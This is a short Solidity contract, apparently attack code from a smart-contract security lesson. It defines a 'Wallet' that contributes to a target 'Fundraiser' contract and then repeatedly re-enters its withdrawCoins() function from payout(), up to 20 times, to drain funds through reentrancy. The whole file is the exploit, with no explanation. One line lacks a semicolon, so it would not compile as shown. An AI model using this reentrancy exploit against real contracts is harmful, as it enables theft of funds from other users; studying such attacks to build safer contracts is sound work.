contract Wallet {

    Fundraiser fundraiser;
    uint recursion = 20;

    function Wallet(address fundraiserAddress) {
        fundraiser = Fundraiser(fundraiserAddress);
    }

    function contribute(uint amount) {
        fundraiser.contribute.value(amount)();
    }

    function withdraw(){
        fundraiser.withdrawCoins();
    }

    function getBalance() constant returns (uint) {
        return address(this).balance;
    }

    function payout() payable {
        if(recursion > 0) {
            recursion--;
            fundraiser.withdrawCoins()
        }
    }

    function() payable {

    }
}